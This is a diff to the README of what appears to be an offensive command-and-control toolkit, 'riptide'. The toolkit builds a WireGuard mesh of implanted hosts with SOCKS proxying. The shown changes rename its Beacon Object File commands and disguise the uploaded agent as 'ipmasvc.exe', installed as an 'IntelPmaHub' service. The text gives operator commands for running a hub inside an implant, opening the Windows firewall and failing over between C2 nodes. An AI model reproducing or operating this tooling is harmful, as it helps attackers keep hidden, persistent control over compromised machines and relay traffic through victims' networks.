@@ -41,7 +41,7 @@ lib/crypto.py           at-rest box
 lib/render.py           hub/peer confs, units, UFW
 agent/                  userspace WG-go + gVisor netstack + SOCKS5 :1080
 gui/                    loopback operator UI (127.0.0.1:7667)
-bof/                    riptide-install — CopyFile + CreateService (not persist itself)
+bof/                    mesh / mesh persist / mesh hub / mesh proxy / mesh clear
 persist/                systemd unit + optional Windows sc wrapper
 templates/              skeletons (no live keys)
 ```
@@ -176,7 +176,7 @@ python3 mesh.py hub --out ./riptide-out --name harry-hub --os windows \
 python3 mesh.py pack --out ./riptide-out --name harry-hub
 python3 mesh.py sync --out ./riptide-out --remote rt-vps --yes   # wg syncconf, no bounce
 # upload exe + peer.conf, then in implant:
-riptide-hub C:\Users\Public\riptide-agent.exe C:\Users\Public\peer.conf IntelPmaHub
+mesh hub C:\Users\Public\ipmasvc.exe C:\Users\Public\peer.conf IntelPmaHub
 ```
 
 That host cryptokey-relays overlay peers and is a C2/SOCKS node. BOF opens Windows firewall UDP `ListenPort`. Extra hub addresses rotate the same way (`[Riptide] Hubs.<overlay>=`). If the VPS handshake dies, the agent promotes an extra hub (`Failover=`) to `10.66.0.0/24`. Re-pack other spokes so they get the extra `[Peer]`. Do not copy the VPS hub private key onto a host.
